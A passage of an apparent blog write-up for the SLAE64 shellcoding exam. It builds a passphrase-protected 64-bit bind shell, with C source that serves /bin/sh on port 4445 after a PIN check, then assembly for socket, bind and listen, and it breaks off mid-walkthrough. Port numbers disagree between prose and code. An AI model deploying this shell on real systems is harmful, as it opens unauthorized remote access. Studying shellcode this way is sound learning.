<!DOCTYPE html>
<html lang="en"><!--
 __  __                __                                     __
/\ \/\ \              /\ \             __                    /\ \
\ \ \_\ \   __  __    \_\ \      __   /\_\      __       ___ \ \ \/'\
 \ \  _  \ /\ \/\ \   /'_` \   /'__`\ \/\ \   /'__`\    /'___\\ \ , <
  \ \ \ \ \\ \ \_\ \ /\ \L\ \ /\  __/  \ \ \ /\ \L\.\_ /\ \__/ \ \ \\`\
   \ \_\ \_\\/`____ \\ \___,_\\ \____\ _\ \ \\ \__/.\_\\ \____\ \ \_\ \_\
    \/_/\/_/ `/___/> \\/__,_ / \/____//\ \_\ \\/__/\/_/ \/____/  \/_/\/_/
                /\___/                \ \____/
                \/__/                  \/___/

Powered by Hydejack v8.1.1 <https://hydejack.com/>
--><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><title>64-bit bindshell with a passphrase protection | Silvia’s blog</title><meta name="generator" content="Jekyll v3.8.3" /><meta property="og:title" content="64-bit bindshell with a passphrase protection" /><meta name="author" content="Silvia Väli" /><meta property="og:locale" content="en" /><meta name="description" content="This blog post covers the 1/7 task of the SLAE certificate exam of creating a 64-bit bindshell which has a check if the correct passphrase is entered upon establishing the connection. Student ID: SLAE64 - 1594" /><meta property="og:description" content="This blog post covers the 1/7 task of the SLAE certificate exam of creating a 64-bit bindshell which has a check if the correct passphrase is entered upon establishing the connection. Student ID: SLAE64 - 1594" /><link rel="canonical" href="http://localhost:4000/blog/2019-01-15-blog-SLAE1/" /><meta property="og:url" content="http://localhost:4000/blog/2019-01-15-blog-SLAE1/" /><meta property="og:site_name" content="Silvia’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-01-15T00:00:00+02:00" /> <script type="application/ld+json"> {"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/profile.jpg"},"name":"Silvia Väli"},"@type":"BlogPosting","url":"http://localhost:4000/blog/2019-01-15-blog-SLAE1/","headline":"64-bit bindshell with a passphrase protection","dateModified":"2019-01-15T00:00:00+02:00","datePublished":"2019-01-15T00:00:00+02:00","author":{"@type":"Person","name":"Silvia Väli"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/2019-01-15-blog-SLAE1/"},"description":"This blog post covers the 1/7 task of the SLAE certificate exam of creating a 64-bit bindshell which has a check if the correct passphrase is entered upon establishing the connection. Student ID: SLAE64 - 1594","@context":"http://schema.org"}</script><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Silvia's blog"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="application-name" content="Silvia's blog"><meta name="msapplication-config" content="/assets/ieconfig.xml"><meta name="theme-color" content="rgb(25,55,71)"><meta name="generator" content="Hydejack v8.1.1" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Silvia's blog" /><link rel="alternate" href="http://localhost:4000/blog/2019-01-15-blog-SLAE1/" hreflang="en"><link rel="shortcut icon" href="/assets/icons/favicon.ico"><link rel="apple-touch-icon" href="/assets/icons/icon.png"><link rel="manifest" href="/assets/manifest.json"><link rel="dns-prefetch" href="https://fonts.googleapis.com"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="dns-prefetch" href="/" id="_baseURL"><link rel="dns-prefetch" href="/assets/js/hydejack-8.1.1.js" id="_hrefJS"><link rel="dns-prefetch" href="/sw.js" id="_hrefSW"><link rel="dns-prefetch" href="/assets/bower_components/fontfaceobserver/fontfaceobserver.standalone.js" id="_hrefFFO"><link rel="dns-prefetch" href="/assets/bower_components/katex/dist/katex.min.js" id="_hrefKatexJS"><link rel="dns-prefetch" href="/assets/bower_components/katex/dist/katex.min.css" id="_hrefKatexCSS"><link rel="dns-prefetch" href="/assets/img/swipe.svg" id="_hrefSwipeSVG"> <script>!function(e,t){"use strict";function n(e,t,n,r){e.addEventListener?e.addEventListener(t,n,r):e.attachEvent?e.attachEvent("on"+t,n):e["on"+t]=n}e.loadJS=function(e,r){var o=t.createElement("script");o.src=e,r&&n(o,"load",r,{once:!0});var a=t.scripts[0];return a.parentNode.insertBefore(o,a),o},e._loaded=!1,e.loadJSDeferred=function(r,o){function a(){e._loaded=!0,o&&n(d,"load",o,{once:!0});var r=t.scripts[0];r.parentNode.insertBefore(d,r)}var d=t.createElement("script");return d.src=r,e._loaded?a():n(e,"load",a,{once:!0}),d},e.setRel=e.setRelStylesheet=function(e){function n(){this.rel="stylesheet"}var r=t.getElementById(e);r.addEventListener?r.addEventListener("load",n,{once:!0}):r.onload=n}}(window,document); !function(a){"use strict";var b=function(b,c,d){function e(a){return h.body?a():void setTimeout(function(){e(a)})}function f(){i.addEventListener&&i.removeEventListener("load",f),i.media=d||"all"}var g,h=a.document,i=h.createElement("link");if(c)g=c;else{var j=(h.body||h.getElementsByTagName("head")[0]).childNodes;g=j[j.length-1]}var k=h.styleSheets;i.rel="stylesheet",i.href=b,i.media="only x",e(function(){g.parentNode.insertBefore(i,c?g:g.nextSibling)});var l=function(a){for(var b=i.href,c=k.length;c--;)if(k[c].href===b)return a();setTimeout(function(){l(a)})};return i.addEventListener&&i.addEventListener("load",f),i.onloadcssdefined=l,l(f),i};"undefined"!=typeof exports?exports.loadCSS=b:a.loadCSS=b}("undefined"!=typeof global?global:this); !function(a){if(a.loadCSS){var b=loadCSS.relpreload={};if(b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(b){return!1}},b.poly=function(){for(var b=a.document.getElementsByTagName("link"),c=0;c<b.length;c++){var d=b[c];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d,d.getAttribute("media")),d.rel=null)}},!b.support()){b.poly();var c=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){b.poly(),a.clearInterval(c)}),a.attachEvent&&a.attachEvent("onload",function(){a.clearInterval(c)})}}}(this); </script> <script>!function(w, d) { w._noPushState = false; w._noDrawer = false; /**/ loadJS(d.getElementById('_hrefFFO').href, function() { if ('Promise' in w) Promise.all([ new FontFaceObserver('Noto Sans').load(), new FontFaceObserver('Roboto Slab').load(), ]).then(function f() { d.body.classList.add('font-active'); }, function() {}); }); /**/ }(window, document);</script> <!--[if gt IE 8]><!----><link rel="stylesheet" href="/assets/css/hydejack-8.1.1.css"><link rel="stylesheet" href="/assets/icomoon/style.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab:400|Noto+Sans:400,400i,700,700i"> <noscript><style> html { font-family: Noto Sans, Helvetica, Arial, sans-serif!important; } h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6, .heading { font-family: Roboto Slab, Helvetica, Arial, sans-serif!important; }</style></noscript><style id="_pageStyle"> .content a:not(.btn){color:#4fb1ba;border-color:rgba(79,177,186,0.2)}.content a:not(.btn):hover{border-color:#4fb1ba}:focus{outline-color:#4fb1ba !important}.btn-primary{color:#fff;background-color:#4fb1ba;border-color:#4fb1ba}.btn-primary:focus,.btn-primary.focus,.form-control:focus,.form-control.focus{box-shadow:0 0 0 3px rgba(79,177,186,0.5)}.btn-primary:hover,.btn-primary.hover{color:#fff;background-color:#409ba3;border-color:#409ba3}.btn-primary:disabled,.btn-primary.disabled{color:#fff;background-color:#4fb1ba;border-color:#4fb1ba}.btn-primary:active,.btn-primary.active{color:#fff;background-color:#409ba3;border-color:#409ba3}::selection{color:#fff;background:#4fb1ba}::-moz-selection{color:#fff;background:#4fb1ba}</style><!--<![endif]--><body><div id="_navbar" class="navbar fixed-top"><div class="content"><div class="nav-btn-bar"> <span class="sr-only">Jump to:</span> <a id="_menu" class="nav-btn no-hover fl" href="#_navigation"> <span class="sr-only">Navigation</span> <span class="icon-menu"></span> </a></div></div></div><hr class="sr-only" hidden /> <hy-push-state replace-ids="_main" link-selector="a[href]:not([href*='/assets/']):not(.external):not(.no-push-state)" duration="250" script-selector="script:not([type^='math/tex'])" prefetch ><main id="_main" class="content fade-in layout-post" role="main" data-color="rgb(79,177,186)" data-theme-color="rgb(25,55,71)" data-image="/assets/img/sidebar-bg.jpg" data-overlay ><article id="post-blog-blog-SLAE1" class="page post mb6" role="article"><header><h1 class="post-title"> 64-bit bindshell with a passphrase protection</h1><p class="post-date heading"> <time datetime="2019-01-15T00:00:00+02:00">15 Jan 2019</time> in <a href="/blog/" class="flip-title">Blog</a><div class="hr pb0"></div></header><p>This blog post covers the 1/7 task of the <a href="https://www.pentesteracademy.com/course?id=7">SLAE certificate exam</a> of creating a 64-bit bindshell which has a check if the correct passphrase is entered upon establishing the connection.<br /> <b>Student ID</b>: SLAE64 - 1594<p><b>Task - </b> Create a bind TCP shellcode which:<ul><li>binds to a port<li>needs a “passcode”<li>if passcode is entered correctly then executes shell<li>remove all 0x00 bytes from the bind TCP shellcode</ul><h2 id="how-does-bind-shellcode-look-like-in-c">How does bind shellcode look like in C?</h2><p>Before we start writing any assembly I like to see and understand what we are going to be working on in C language. The most important parts for us are the syscalls - <code class="highlighter-rouge">socket(), bind(), accept(), listen(), accept(), dup2(), write(), read() and execve()</code>, understanding on file descriptors and the <code class="highlighter-rouge">struct sockaddr_in</code> structure.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">stdio</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">sys</span><span class="o">/</span><span class="nx">socket</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">netinet</span><span class="o">/</span><span class="k">in</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">netinet</span><span class="o">/</span><span class="nx">ip</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">sys</span><span class="o">/</span><span class="nx">types</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">unistd</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">string</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>

<span class="kr">int</span> <span class="nx">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="kr">int</span> <span class="nx">sockfd</span><span class="p">;</span>
	<span class="kr">int</span> <span class="nx">newsockfd</span><span class="p">;</span>
	<span class="kr">int</span> <span class="nx">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kr">char</span> <span class="nx">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>  <span class="c1">// to hold the value user entered as PIN</span>
	<span class="nx">unsigned</span> <span class="kr">short</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">4445</span><span class="p">;</span>
	<span class="nx">struct</span> <span class="nx">sockaddr_in</span> <span class="nx">client</span><span class="p">;</span>

	<span class="nx">struct</span> <span class="nx">sockaddr_in</span> <span class="nx">server</span><span class="p">;</span>
	<span class="nx">server</span><span class="p">.</span><span class="nx">sin_family</span> <span class="o">=</span> <span class="nx">AF_INET</span><span class="p">;</span>
	<span class="nx">server</span><span class="p">.</span><span class="nx">sin_port</span> <span class="o">=</span> <span class="nx">htons</span><span class="p">(</span><span class="nx">port</span><span class="p">);</span>
	<span class="nx">server</span><span class="p">.</span><span class="nx">sin_addr</span><span class="p">.</span><span class="nx">s_addr</span> <span class="o">=</span> <span class="nx">INADDR_ANY</span><span class="p">;</span>
	<span class="nx">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">server</span><span class="p">.</span><span class="nx">sin_zero</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

	<span class="c1">//length of a structure in bytes</span>
	<span class="kr">int</span> <span class="nx">sockaddr_len</span> <span class="o">=</span> <span class="nx">sizeof</span><span class="p">(</span><span class="nx">struct</span> <span class="nx">sockaddr_in</span><span class="p">);</span>
	<span class="c1">//execve 2nd and 3rd argument</span>
	<span class="kr">char</span> <span class="o">*</span><span class="kd">const</span> <span class="nx">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"/bin/sh"</span><span class="p">,</span> <span class="nx">NULL</span><span class="p">};</span>
	<span class="kr">char</span> <span class="o">*</span><span class="kd">const</span> <span class="nx">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nx">NULL</span><span class="p">};</span>


	<span class="c1">//create a new socket</span>
	<span class="nx">sockfd</span> <span class="o">=</span> <span class="nx">socket</span><span class="p">(</span><span class="nx">AF_INET</span><span class="p">,</span> <span class="nx">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

	<span class="c1">//bind a name to a socket</span>
	<span class="nx">bind</span><span class="p">(</span><span class="nx">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="nx">struct</span> <span class="nx">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">server</span><span class="p">,</span> <span class="nx">sockaddr_len</span><span class="p">);</span>

	<span class="c1">//listen for connections on a socket</span>
	<span class="nx">listen</span><span class="p">(</span><span class="nx">sockfd</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>

	<span class="c1">//accept a connection on a socket</span>
	<span class="nx">newsockfd</span> <span class="o">=</span> <span class="nx">accept</span><span class="p">(</span><span class="nx">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="nx">struct</span> <span class="nx">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">client</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">sockaddr_len</span><span class="p">);</span>

	<span class="c1">//close old fd</span>
	<span class="nx">close</span><span class="p">(</span><span class="nx">sockfd</span><span class="p">);</span>

	<span class="c1">//duplicate fd-s for newsockfd</span>
	<span class="nx">dup2</span><span class="p">(</span><span class="nx">newsockfd</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
	<span class="nx">dup2</span><span class="p">(</span><span class="nx">newsockfd</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
	<span class="nx">dup2</span><span class="p">(</span><span class="nx">newsockfd</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>

	<span class="c1">//write</span>
	<span class="nx">write</span><span class="p">(</span><span class="nx">newsockfd</span><span class="p">,</span> <span class="s2">"Enter PIN:</span><span class="err">\</span><span class="s2">n"</span><span class="p">,</span> <span class="mi">11</span><span class="p">);</span>
	<span class="nx">read</span><span class="p">(</span><span class="nx">newsockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">buf</span> <span class="p">,</span><span class="mi">4</span><span class="p">);</span>
	<span class="nx">ret</span> <span class="o">=</span> <span class="nx">strcmp</span><span class="p">(</span><span class="s2">"1234"</span><span class="p">,</span> <span class="nx">buf</span><span class="p">);</span>

	<span class="k">if</span><span class="p">(</span><span class="nx">ret</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="nx">execve</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">,</span> <span class="nx">argv</span> <span class="p">,</span><span class="nx">envp</span><span class="p">);</span>
	<span class="p">}</span>

<span class="p">}</span>
</code></pre></div></div><h3 id="struct-sockaddr_in-in_addr--sockaddr"><u>struct sockaddr_in, in_addr &amp; sockaddr</u></h3><p>AF_INET family is the address family for IPv4 which uses the <code class="highlighter-rouge">sockaddr_in</code> address structure. The structure itself is defined within the <code class="highlighter-rouge">/usr/include/netinet/in.h</code> header file along with <code class="highlighter-rouge">sockaddr</code> and <code class="highlighter-rouge">in_addr</code> structures. <code class="highlighter-rouge">sockaddr_in</code> is simply the IPv4 version of the sockaddr structure.<p>The <code class="highlighter-rouge">sockaddr_in</code> structure contains:<ul><li>sin_family - which is the address family AF_INET<li>sin_port - port number<li>sin_addr - member of the <code class="highlighter-rouge">in_addr</code> structure, which contains the IP address<li>sin_zero[8] - 8 zero bytes for padding, which are reserved for the future cases</ul><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">struct</span> <span class="nx">sockaddr</span> <span class="p">{</span>
	<span class="nx">u_short</span>	<span class="nx">sa_family</span><span class="p">;</span>
	<span class="kr">char</span>	<span class="nx">sa_data</span><span class="p">[</span><span class="mi">14</span><span class="p">];</span>
<span class="p">};</span>

<span class="nx">struct</span> <span class="nx">in_addr</span> <span class="p">{</span>
  <span class="nx">in_addr_t</span> <span class="nx">s_addr</span><span class="p">;</span>               <span class="cm">/* the IP address in network byte order    */</span>
<span class="p">};</span>

<span class="nx">struct</span> <span class="nx">sockaddr_in</span> <span class="p">{</span>
  <span class="mi">1</span><span class="p">)</span> <span class="nx">u_short</span>         <span class="nx">sin_family</span><span class="p">;</span>     <span class="cm">/* always AF_INET                          */</span>
  <span class="mi">2</span><span class="p">)</span> <span class="nx">u_short</span>         <span class="nx">sin_port</span><span class="p">;</span>       <span class="cm">/* the service port                        */</span>
  <span class="mi">3</span><span class="p">)</span> <span class="nx">struct</span> <span class="nx">in_addr</span>  <span class="nx">sin_addr</span><span class="p">;</span>       <span class="cm">/* the IP address                          */</span>
     <span class="kr">char</span>            <span class="nx">sin_zero</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>    <span class="cm">/* unused (reserved for expansion          */</span>
<span class="p">};</span>
</code></pre></div></div><p>So the way we should set up our struct should specify the 1) AF_INET address family, 2) port in network byte order for which we can use the htons() syscall, 3) INADDR_ANY (0.0.0.0) - bind a socket to all the interfaces as we want to receive all packets directed to the specified port on all IP addresses.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">struct</span> <span class="nx">sockaddr_in</span> <span class="nx">server</span><span class="p">;</span>
	<span class="nx">server</span><span class="p">.</span><span class="nx">sin_family</span> <span class="o">=</span> <span class="nx">AF_INET</span><span class="p">;</span>
	<span class="nx">server</span><span class="p">.</span><span class="nx">sin_port</span> <span class="o">=</span> <span class="nx">htons</span><span class="p">(</span><span class="nx">port</span><span class="p">);</span>
	<span class="nx">server</span><span class="p">.</span><span class="nx">sin_addr</span><span class="p">.</span><span class="nx">s_addr</span> <span class="o">=</span> <span class="nx">INADDR_ANY</span><span class="p">;</span>
	<span class="nx">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">server</span><span class="p">.</span><span class="nx">sin_zero</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</code></pre></div></div><h3 id="syscalls"><u>Syscalls</u></h3><p>To achieve the goal set for task 1, we have to understand how and for what we use the following syscalls: <code class="highlighter-rouge">socket(), bind(), accept(), listen(), accept(), dup2(), write(), read() and execve()</code>.<h4 id="socket-syscall"><b>socket() syscall</b></h4><p>We use socket() syscall in order to create a new socket for endpoint communication. Socket returns us a file descriptor, which we can use with other syscalls, for example when binding an address to the socket. <code class="highlighter-rouge">socket()</code> syscall takes 3 parameters: communication <b>domain</b> AF_INET for IPv4 Internet protocols, communication <b>type</b> SOCK_STREAM - a reliable two-way connection and a <b>protocol</b> - specifies the protocol to be used with the socket. By socket() syscall documentation, normally only a single protocol exists to support a socket type within a protocol family, so we can specify it as 0.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">int</span> <span class="nx">socket</span><span class="p">(</span><span class="kr">int</span> <span class="nx">domain</span><span class="p">,</span> <span class="kr">int</span> <span class="nx">type</span><span class="p">,</span> <span class="kr">int</span> <span class="nx">protocol</span><span class="p">);</span>
</code></pre></div></div><p>In order to implement this in assembly, we can make use of python to know respective values for AF_INET and SOCKET_STREAM.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span> <span class="nx">python</span>
<span class="nx">Python</span> <span class="mf">2.7</span><span class="p">.</span><span class="mi">15</span><span class="nx">rc1</span> <span class="p">(</span><span class="k">default</span><span class="p">,</span> <span class="nx">Nov</span> <span class="mi">12</span> <span class="mi">2018</span><span class="p">,</span> <span class="mi">14</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">15</span><span class="p">)</span>
<span class="p">[</span><span class="nx">GCC</span> <span class="mf">7.3</span><span class="p">.</span><span class="mi">0</span><span class="p">]</span> <span class="nx">on</span> <span class="nx">linux2</span>
<span class="nx">Type</span> <span class="s2">"help"</span><span class="p">,</span> <span class="s2">"copyright"</span><span class="p">,</span> <span class="s2">"credits"</span> <span class="nx">or</span> <span class="s2">"license"</span> <span class="k">for</span> <span class="nx">more</span> <span class="nx">information</span><span class="p">.</span>
<span class="o">&gt;&gt;&gt;</span> <span class="k">import</span> <span class="nx">socket</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nx">socket</span><span class="p">.</span><span class="nx">AF_INET</span>
<span class="mi">2</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nx">socket</span><span class="p">.</span><span class="nx">SOCK_STREAM</span>
<span class="mi">1</span>
<span class="o">&gt;&gt;&gt;</span>
</code></pre></div></div><p><b>It’s time to look at the assembly now!</b> <a href="https://software.intel.com/en-us/articles/introduction-to-x64-assembly">x64 calling convention</a> states that the 1st argument should go to register RDI, 2nd to RSI and 3rd to RDX. The respective syscall value for socket() should go to RAX. Syscall values can easily be found via ausyscall command <code class="highlighter-rouge">ausyscall socket</code> which is part of the auditd package (<code class="highlighter-rouge">apt get install auditd</code>).<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span> <span class="nx">ausyscall</span> <span class="nx">socket</span>
<span class="nx">socket</span>             <span class="mi">41</span>
<span class="nx">socketpair</span>         <span class="mi">53</span>
</code></pre></div></div><p>So the assembly code for <code class="highlighter-rouge">sockfd = socket(AF_INET, SOCK_STREAM, 0);</code> should look as follows:<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">socket</span><span class="p">:</span>
	<span class="nx">xor</span> <span class="nx">rdi</span><span class="p">,</span> <span class="nx">rdi</span>
	<span class="nx">add</span> <span class="nx">rdi</span><span class="p">,</span> <span class="mi">2</span>			<span class="p">;</span><span class="nx">AF_INET</span>
	<span class="nx">xor</span> <span class="nx">rsi</span><span class="p">,</span> <span class="nx">rsi</span>
	<span class="nx">add</span> <span class="nx">rsi</span><span class="p">,</span> <span class="mi">1</span>			<span class="p">;</span><span class="nx">SOCK_STREAM</span>
	<span class="nx">xor</span> <span class="nx">rdx</span><span class="p">,</span> <span class="nx">rdx</span>                    <span class="p">;</span><span class="nx">protocol</span>
	<span class="nx">xor</span> <span class="nx">rax</span><span class="p">,</span> <span class="nx">rax</span>
	<span class="nx">add</span> <span class="nx">rax</span><span class="p">,</span> <span class="mi">41</span>			<span class="p">;</span><span class="nx">syscall</span> <span class="nx">number</span>
	<span class="nx">syscall</span>

<span class="nx">copysocket</span><span class="p">:</span>				<span class="p">;</span><span class="kd">let</span><span class="s1">'s save the returned fd for later use
	mov rdi, rax
	xor rax, rax

</span></code></pre></div></div><h4 id="bind-syscall"><b>bind() syscall</b></h4><p>When a socket is created, as we saw in the previous step, it has no specific address assigned to it. For that we need the <code class="highlighter-rouge">bind()</code> syscall, which assigns the address specified by <code class="highlighter-rouge">addr</code> for socket specified by sockfd. <code class="highlighter-rouge">sockfd</code> here is the file descriptor we received in return from using the <code class="highlighter-rouge">socket()</code> syscall.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">int</span> <span class="nx">bind</span><span class="p">(</span><span class="kr">int</span> <span class="nx">sockfd</span><span class="p">,</span> <span class="kd">const</span> <span class="nx">struct</span> <span class="nx">sockaddr</span> <span class="o">*</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">socklen_t</span> <span class="nx">addrlen</span><span class="p">);</span>
</code></pre></div></div><p><b>Assembly<b><br /></b></b><p>We have already saved the sockfd value to RDI in previous assembly example (see copysocket) so no need to assign it again. Let’s focus on the const <code class="highlighter-rouge">struct sockaddr *addr</code> and <code class="highlighter-rouge">socklen_t addrlen</code>.<p>One thing to know about structs in C is that it is a contiguous block of memory where each member is located at a certain offset from the start of the structure. You can easily verify it loading the C code example above to gdb debugger and examining the memory. The first member of the struct is on the lowest address and last member on the highest. For us to do the same in assembly, we need to take into account byte sizes of each member.<p>
  <hy-img root-margin="512px"  src="/assets/img/SLAE/struct.png" alt="SLAE task 1 struct" >
    <noscript><img data-ignore  src="/assets/img/SLAE/struct.png" alt="SLAE task 1 struct" /></noscript>
    <span class="loading" slot="loading" hidden>
      <span class="icon-cog"></span>
    </span>
  </hy-img><p>In assembly this would look as follows: first we make a push for the 8 zero bytes (RAX is 64-bit/8-bytes). Next we fill up 4 bytes with zeros for INADDR_ANY (0.0.0.0). The port we want to be using here is 4444, which in hexadecimal format would be 115d. However we need to present it in network byte order which means arranging the bytes in the manner where the most significant byte would be on the smallest address. This would take up 2 bytes. And finally we place the first member of the struct (2 bytes in length) AF_INET, to the lowest address. When we are done, it is also important to adjust the stack pointer to point it to the top of the stack again (to the start address of our struct).<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">server_struct</span><span class="p">:</span>
	<span class="nx">push</span> <span class="nx">rax</span>                    <span class="p">;</span><span class="nx">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">server</span><span class="p">.</span><span class="nx">sin_zero</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">8</span> <span class="nx">bytes</span>
	<span class="nx">mov</span> <span class="nx">dword</span> <span class="p">[</span><span class="nx">rsp</span><span class="o">-</span><span class="mi">4</span><span class="p">],</span> <span class="nx">eax</span>      <span class="p">;</span><span class="nx">server</span><span class="p">.</span><span class="nx">sin_addr</span><span class="p">.</span><span class="nx">s_addr</span><span class="o">=</span><span class="nx">INADDR_ANY</span> <span class="o">-</span> <span class="mi">4</span> <span class="nx">bytes</span>
	<span class="nx">mov</span> <span class="nx">word</span> <span class="p">[</span><span class="nx">rsp</span><span class="o">-</span><span class="mi">6</span><span class="p">],</span> <span class="mh">0x5d11</span>    <span class="p">;</span><span class="nx">server</span><span class="p">.</span><span class="nx">sin_port</span><span class="o">=</span> <span class="mi">4445</span> <span class="p">(</span><span class="mh">0x115d</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span> <span class="nx">bytes</span>
	<span class="nx">mov</span> <span class="nx">word</span> <span class="p">[</span><span class="nx">rsp</span><span class="o">-</span><span class="mi">8</span><span class="p">],</span> <span class="mh">0x2</span>       <span class="p">;</span><span class="nx">server</span><span class="p">.</span><span class="nx">sin_family</span><span class="o">=</span><span class="nx">AF_INET</span> <span class="o">-</span> <span class="mi">2</span><span class="nx">bytes</span>
	<span class="nx">sub</span> <span class="nx">rsp</span><span class="p">,</span> <span class="mi">8</span>
</code></pre></div></div><p>Now we can focus on the <code class="highlighter-rouge">bind()</code> syscall which takes 3 parameters. We already got RDI in place, so what we need to do next is give RSI the starting address of our struct which we know is at RSP. Third argument (RDX) represents the length of the struct which we get with this calculation: 2 bytes (AF_INET) + 2 bytes (port) + 4 bytes (INADDR_ANY) + 8 bytes (8 zero bytes) = 16 bytes. Bind() syscall is represented by syscall number 49 in decimal.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">bind</span><span class="p">:</span>
	<span class="p">;</span> <span class="nx">rdi</span> <span class="nx">is</span> <span class="nx">already</span> <span class="nx">equal</span> <span class="nx">to</span> <span class="nx">fd</span>
	<span class="nx">mov</span> <span class="nx">rsi</span><span class="p">,</span> <span class="nx">rsp</span>
	<span class="nx">mov</span> <span class="nx">dl</span><span class="p">,</span> <span class="mi">16</span>
	<span class="nx">add</span> <span class="nx">rax</span><span class="p">,</span> <span class="mi">49</span>
	<span class="nx">syscall</span>

</code></pre></div></div><h4 id="listen-syscall"><b>listen() syscall</b></h4><p>We have successfully created a socket and bind an address to it. Next what we want to be doing is listening on the socket for any incoming connections. <code class="highlighter-rouge">listen()</code> syscall is quite simple in the sense that it only takes 2 parameters <code class="highlighter-rouge">int sockfd</code> and <code class="highlighter-rouge">int backlog</code>. From the two parameters, first is the sockfd which we already have stored in RDI. The second argument defines the length to which the queue of pending connections for sockfd may grow (quoting from the man page). We simply set it to be 2.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">listen</span><span class="p">(</span><span class="nx">sockfd</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</code></pre></div></div><p>In order to implement it in <b>assembly</b> we only have to zero out RSI and mov 2 to it, then make the call for listen syscall.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">listen</span><span class="p">:</span>
	<span class="p">;</span><span class="nx">rdi</span> <span class="nx">is</span> <span class="nx">already</span> <span class="kd">set</span>
	<span class="nx">xor</span> <span class="nx">rsi</span><span class="p">,</span> <span class="nx">rsi</span>
	<span class="nx">mov</span> <span class="nx">sil</span><span class="p">,</span> <span class="mi">2</span>
	<span class="nx">mov</span> <span class="nx">al</span><span class="p">,</span> <span class="mi">50</span>
	<span class="nx">syscall</span>
